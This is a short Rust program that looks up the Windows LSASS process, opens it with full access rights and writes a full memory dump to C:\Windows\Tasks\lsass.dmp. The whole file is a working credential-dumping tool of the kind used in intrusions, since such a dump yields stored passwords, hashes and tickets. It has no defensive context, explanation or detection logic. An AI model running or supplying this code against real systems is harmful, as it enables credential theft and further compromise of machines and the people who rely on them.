use sysinfo::{PidExt, ProcessExt, System, SystemExt};
use windows::core::{Error, Result, PCSTR};
use windows::Win32::Foundation::{CloseHandle, E_FAIL};
use windows::Win32::Storage::FileSystem::{
    CreateFileA, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 
    FILE_GENERIC_WRITE, FILE_SHARE_READ, FILE_SHARE_WRITE,
};
use windows::Win32::System::{
    Diagnostics::Debug::{
        MiniDumpWithFullMemory, 
        MiniDumpWriteDump
    }, 
    Threading::{
        OpenProcess, 
        PROCESS_ALL_ACCESS
    }
};

/// Finds the PID of the LSASS process (`lsass.exe`).
///
/// # Returns
///
/// * `Ok(u32)` - The PID of the LSASS process if found.
/// * `Err` - If the process is not found.
fn find_lsass() -> Result<u32> {
    let mut system = System::new_all();
    system.refresh_all();

    let processes = system
        .processes()
        .values()
        .filter(|process| process.name().to_lowercase() == "lsass.exe")
        .collect::<Vec<_>>();

    if let Some(process) = processes.into_iter().next() {
        println!("[+] LSASS process with PID found: {}", process.pid());
        return Ok(process.pid().as_u32());
    }

    Err(Error::new(E_FAIL, "Error finding lsass PID!".into()))
}

fn main() -> Result<()> {
    unsafe {
        // Find the PID of the LSASS process
        let pid = find_lsass()?;

        // Open a handle to the LSASS process with full access rights
        let h_process = OpenProcess(PROCESS_ALL_ACCESS, false, pid)?;
        
        // Create a new file to store the LSASS dump
        let path = c"C:\\Windows\\Tasks\\lsass.dmp";
        let h_file = CreateFileA(
            PCSTR(path.as_ptr() as *const u8),
            FILE_GENERIC_WRITE.0,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            None,
            CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            None,
        )?;

        // Write the full memory dump of the LSASS process into the file
        MiniDumpWriteDump(
            h_process,
            pid,
            h_file,
            MiniDumpWithFullMemory,
            None,
            None,
            None,
        )?;

        println!("[+] lsass dump successful!");
        CloseHandle(h_process)?;
        CloseHandle(h_file)?;
    }

    Ok(())
}
